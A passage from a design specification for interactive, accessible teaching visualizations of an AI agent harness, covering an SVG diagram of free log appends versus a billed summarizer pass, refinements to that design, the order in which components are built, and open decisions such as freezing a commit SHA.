One build-time static inline SVG, four tier bands; the interactive Tier 2 holds the roving-tabindex pills, the accreting cylinder, and the scan track; `TracePlayer` mutates it. A first-class `role="tree"` twin (tiers as root nodes; expanding the rolling log reveals the seven real `LogRecord` rows; selecting a row is the same load-bearing action and grows the brain subtree), the natural primary surface here, server-rendered and fully present JS-off including the post-select brain subtree inside `<details>`. The data model is the exact `rolling-log.mjs` `logEntry` shape plus the tier/cost/signal/brain-note types; signals and brain notes are derived at build by running the ported predicates over the fixed log, so the twin is same-data-not-paraphrase. One integer step cursor (0 to 7), decorator not app-state. ~22KB gz, leaner than `TracePlayer` (single vertical scan path, no scrubber timeline). Reading path 0KB framework.

### Accessibility (summary)
The tree twin is the primary experience: roving-tabindex, arrow keys to move and expand, Enter to select (the load-bearing action), the same ordered step-script as the SVG. The focus ring is the token. One aria-live region narrates the causal arc as authored sentences, gated to manual cadence, including the critical "the click itself was free" beat. No drag anywhere (2.5.7 by construction). A forced-colors screenshot is a required review artifact.

### Dialed in
The thesis is correct, but lit-versus-dim accidentally encodes "active versus off," the inverse of "three are busy and free, one is billed." The fix is one conceptual move repeated everywhere.
- **Render FREE as a positive material.** The three cheap tiers get a continuous faint sand engraved-hairline "hum" lit at rest in `--signal-dim`, so the resting frame says "three layers are alive and working, and none is wired to the meter." This is a static lit hairline baked into the build-time SVG (a material, not a pulsing animation), so the static fallback carries the full lesson with zero motion and zero label-reading, passing the "one finger" bar JS-off.
- **Give only the billed tier a meter gutter.** A thin vertical amber rule with one tick down its left edge, visually quoting an electricity meter. Cost stops being a number you read and becomes a chrome only one band wears. Strip every cost-chip and you can still point to the one metered band. The tick-mark geometry (not the amber hue) must survive monochrome, so forced-colors still shows the one-tier asymmetry.
- **Separate the click from the scan.** Clicking a pill fires one honest thing first: the append draws into the cylinder with an instant mono micro-stamp "appended · 0 tokens" (and a real aria-live announcement, the first sentence in the step-script). A beat of dead air. Only then does the summarizer descend. This kills the false "click to scan to cost" causal chain and teaches the gap the whole viz exists for: the append is done and free; the billing is a separate later event.
- **Originate the scanner from the bottom.** The playhead reaches up from `precompact-llm.mjs` through the whole log, not down from the clicked pill, and passes over the clicked-and-still-lit pill without treating it specially, teaching that your append is just one anonymous line of seven to the summarizer.
- **Collapse the climax to one place.** As the needle hits bottom, the three free hums dim to near-nothing for ~200ms (the room holds its breath, a duration-0 snap under reduced-motion) and the violet hexagon is the only thing that fills. The two brain outputs accrete sequentially after the hexagon peaks, never co-equal with it.
- **Replace the timid pulse with a receipt stamp.** A mono line lands with `--ease-settle` decisiveness like a committed transaction: "3 appends · 0 tokens → 1 distillation · ~8000 tokens," set in the machine voice.
- **Cut the filler.** Demote Tier 3 (the 847-to-60-char truncation) into a single inline arrow on one pill's inspector payload rather than its own band, protecting the two-beat story; show only the two or three signal counters that actually trip on this fixed log; flash only the rows that trip a signal, not all seven.

---

## Build order (from the workshop red-team)

The visualizations are not the first thing built. The provenance and grammar spine comes first, because every set-piece depends on it.

1. **Freeze the pin SHA** (a clean committed SHA in `build-a-claude-harness`) and stand up the provenance pipeline: `extract-excerpts.mjs`, the link-checker, and the model generators that read the real `settings.template.json`, hook modules, and the 7.2 `evaluate-policy.mjs`. No viz is built until this gate is green.
2. **Freeze the `DiagramModel` / `TraceModel` contract** (F2, effectively XL), the node taxonomy, the typed-edge kit, and the auto-generated legend.
3. **Build `TracePlayer`** (the shared decorator island) against SV-3, the richest consumer; SV-1 and SV-5 then reuse it.
4. **SV-3 first as the capstone**, since it exercises the full grammar and is the persistent Phase-2 territory; SV-1 second as the hero (it is the simplest consumer of the same kit).
5. **`ApprovalGate` and SV-4** once the trust grammar and `evaluate()` port are proven.
6. **SV-2 and SV-5** as Tier-2 set-pieces, each a bespoke island reusing the twin conventions.
7. **The CI budget and a11y gates** (per-island gzip, per-page JS, 0KB-framework assertion on reading routes, Lighthouse, link-checker, excerpt-drift, rule-id drift, forced-colors screenshots, axe-core, no-JS smoke) wired before the first set-piece merges, then enforced for every one after.

---

## Open decisions specific to the visualizations

1. **Canonical pin SHA (blocking).** Same as design-system open decision 1: freeze a clean committed SHA before any viz cites it. The teaching repo had uncommitted changes at workshop time, which is the entire reason the SV-2 evidence pin must target a committed SHA and not the working tree.
2. **SV-1 contract-row provenance.** Decide between the sandboxed build-time stdin probe and the honest dashed "unpinnable" treatment for drawer row 2. Do not ship an unverified `FACT` pin.
3. **SV-3 second memory cylinder.** Confirm the elevation choice to fold `memory.json` into a compartment of the one disk rather than drawing a second accreting cylinder, so there is exactly one growing landmark.
4. **SV-4 detonation magnitude.** The "247, one every 1.9 minutes" figure is illustrative. Confirm the number and the stolen-night framing before authoring the baked glyph field, and keep it stamped illustrative in every render.
